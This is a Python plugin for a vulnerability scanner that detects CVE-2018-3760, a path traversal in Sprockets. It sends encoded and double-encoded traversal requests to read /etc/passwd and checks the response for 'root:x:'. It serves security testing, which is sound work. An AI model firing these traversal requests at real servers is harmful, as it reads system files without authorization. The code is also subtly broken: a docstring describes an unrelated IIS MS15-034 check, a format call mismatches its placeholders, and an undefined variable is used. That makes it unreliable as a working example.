from scanner.core.controller.plugin import DetectorPlugin
from scanner.knowledge_base.data_container.http.url import URL
from scanner.misc.utils.logger import singleton_logger as core_logger

import re


class cve_2018_3760(DetectorPlugin):
	"""
	Detect CVE-2018-3760 (Path Traversal in Sprockets)
	"""
	NAME = "CVE 2018-3760"
	RESOURCE_TYPES = [ URL ]
	CS_VULN_TEMPLATE_ID = "2000030"


	def discover(self, url):
		"""
		Checks if the remote IIS is vulnerable to MS15-034
		"""
		url = url.join("/assets/file:%2f%2f/etc/passwd")
		http_request = self.create_http_request(url=url)
		http_response = self.requester.http.send(request=http_request)

		match =  re.search("/etc/passwd is no longer under a load path: (\S+),?", http_response.get_body())
		vuln_data = {
			"file": "/etc/passwd",
		}
		if match:
			allowed_path = match.group(1).strip(",")
			skipper = "/%252e%252e" * (allowed_path.count("/"))
			url = url.join("/assets/file:%2f%2f{allowed_path}{skipper}/etc/passwd".format(allowed_path, skipper))
			http_request = self.create_http_request(url=url)
			http_response = self.requester.http.send(request=http_request)
			vuln_data["allowed_path"] = allowed_path

		if "root:x:" in http_response.get_body():

			attributes = {
				"base_url": str(request.url.get_full_domain_with_path()),
				"url": str(url)
			}
			traffics = [
				http_response.id
			]
			core_logger.info("Vulnerability is found: %s, URL%r" %(self.get_name(),str(url)))
			self.save_vuln(traffics=traffics,attributes=attributes)

			



